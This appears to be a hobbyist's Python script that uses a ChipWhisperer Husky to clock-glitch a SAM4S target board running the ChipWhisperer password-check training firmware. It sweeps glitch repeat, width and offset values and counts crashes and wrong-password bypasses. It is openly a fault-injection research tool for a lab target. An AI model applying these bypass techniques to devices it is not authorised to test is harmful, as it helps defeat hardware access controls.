#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Clock glitch on the CW312T-SAM4S through the UFO and the Abductor, sweeping scope.glitch.repeat
# (the number of consecutive glitched cycles) over 1, 2, 4, 8, 16 and 32, to test whether more
# glitched cycles get past a suspected attenuation of the glitch on that path. One run cannot show
# the attenuation; that needs matched sweeps on the CW313 and through the UFO and Abductor.
# A bypass is the wrong password ([0]*5) accepted (passok=1).
# The script builds simpleserial-glitch for CW312_SAM4S with the xpack toolchain in TC and flashes
# it. Adjust the paths below first. No arguments. Prints the crash, normal and clean-bypass counts
# for each repeat value, then the first repeat value with a clean bypass. Saves no file.
# Exits with status 2 if flashing or the glitch-free password check fails.
import os, time, subprocess
from collections import Counter
import chipwhisperer as cw

PLATFORM="CW312_SAM4S"; SS_VER="SS_VER_2_1"
FWDIR="/home/dreg/chipwhisperer/firmware/mcu/simpleserial-glitch"
HEX=f"{FWDIR}/simpleserial-glitch-{PLATFORM}.hex"
TC="/home/dreg/toolchains/xpack-arm-none-eabi-gcc-13.3.1-1.1/bin"
ENV=dict(os.environ, PATH=TC+":"+os.environ["PATH"])

# Build (make without clean) and flash again, in case the target was moved or power-cycled. The
# build result is not checked: the flash uses whatever hex is in FWDIR.
subprocess.run(["make",f"PLATFORM={PLATFORM}","CRYPTO_TARGET=NONE",f"SS_VER={SS_VER}","-j"],
               cwd=FWDIR, env=ENV, capture_output=True)
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup()
ok=False
for k in range(3):
    try: cw.program_target(scope, cw.programmers.SAM4SProgrammer, HEX); ok=True; print("FLASHED OK", flush=True); break
    except Exception as e: print("flash retry:", e, flush=True); time.sleep(1.0)
if not ok:
    print("FLASH FAILED - reconnect USB", flush=True); raise SystemExit(2)
target.reset_comms()
# Clock glitch: the Husky Plus XORs glitch pulses into the target clock and drives it out on HS2.
scope.glitch.enabled=True; scope.glitch.clk_src="pll"; scope.glitch.output="clock_xor"
scope.glitch.trigger_src="ext_single"; scope.io.hs2="glitch"; scope.cglitch_setup(); scope.adc.timeout=0.1
def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()
WRONG=bytearray([0]*5)
def check(pw):
    reboot_flush(); target.simpleserial_write('p', pw)
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=1000)
    return v['payload'][0] if (v['valid'] and v['payload']) else None
# Glitch-free check: the wrong password must return 0 and "touch" (the bytes below) 1.
_w=check(WRONG); _c=check(bytearray([0x74,0x6F,0x75,0x63,0x68]))
print("sanity wrong ->",_w," correct ->",_c, flush=True)
if _w!=0 or _c!=1:
    print("SANITY FAILED", flush=True); scope.dis(); target.dis(); raise SystemExit(2)
# One glitched attempt from a fresh reset: "success" is a bypass, "normal" a rejected password,
# "reset" a crash (capture timeout or no valid reply), after which the target is reset again.
def attempt(rep,w,o,e):
    if scope.adc.state: reboot_flush()
    reboot_flush()
    scope.glitch.repeat=rep; scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    scope.arm(); target.simpleserial_write('p', WRONG)
    if scope.capture(): reboot_flush(); return "reset"
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not v['valid'] or v['payload'] is None: reboot_flush(); return "reset"
    return "success" if v['payload'][0]==1 else "normal"

cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()
# 4 widths x 4 offsets x 25 ext_offsets (85 to 157, step 3): 400 attempts per repeat value. Width
# and offset are Husky phase-shift steps; ext_offset is target clock cycles after the trigger.
WIDTHS=[3400,3800,4200,4500]; OFFS=[2300,2500,2700,2900]; EXTS=list(range(85,160,3))
overcame=None   # first repeat value with a clean bypass, printed at the end
for rep in [1,2,4,8,16,32]:
    c=Counter(); succ=[]
    for w in WIDTHS:
        for o in OFFS:
            for e in EXTS:
                cat=attempt(rep,w,o,e); c[cat]+=1
                if cat=="success": succ.append((rep,w,o,e))
    print(f"repeat={rep:2d}: reset={c['reset']:3d} normal={c['normal']:3d} success={c['success']:2d}"
          + (f"  bypass: {succ[0]}" if succ else ""), flush=True)
    if c['success']>0 and overcame is None:
        overcame=rep
        print(f"  --> clean password bypass (wrong password accepted) first seen at repeat={rep}: {succ[0]}", flush=True)
    elif (c['reset']+c['success'])>=3 and rep and not overcame:
        # no clean bypass so far but at least 3 crashes: the glitch reaches the core, and its
        # faults are crashes
        print(f"      (repeat={rep}: glitch faults the SAM4S but crash-dominated; {c['reset']} resets, {c['success']} clean bypasses)", flush=True)
cw.set_all_log_levels(cw.logging.WARNING); scope.dis(); target.dis()
print("first repeat with a clean bypass:", overcame)
print("DONE")
